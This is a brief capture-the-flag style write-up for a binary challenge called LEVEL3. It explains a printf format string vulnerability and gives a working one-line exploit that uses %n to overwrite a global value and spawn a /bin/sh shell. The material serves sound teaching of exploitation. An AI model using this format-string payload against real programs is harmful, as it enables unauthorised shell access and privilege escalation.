# LEVEL3

## EXPLANATIONS
### BINARY BEHAVIOR
- function \<v\> called from main  
    -> call to fgets with a maximum of 512 read on stdin and put in buf  
    -> call to printf with buf on first arg(format string)  
    -> cmp between string in datasection and 0x40

    ---> If equal, we see the string in 0x8048600 that we succeed, then a syscall on /bin/sh is made.

### EXPLOI STRATEGY

Our goal is to have 0x40 (64 in base 10) inside this memory area.

- We are going to exploit the format string printf with the identifier %n that allow us to write a value in memory  
- we write in the buffer :  
    - string address in which to write 0x40  
    - %60x  
    - %4\$n

### RUN COMMAND
```
python -c "print('\x08\x04\x98\x8c'[::-1] + '%60x' + '%4\$n')" > /tmp/exploit_string
cat /tmp/exploit_string - | /home/user/level3/level3
```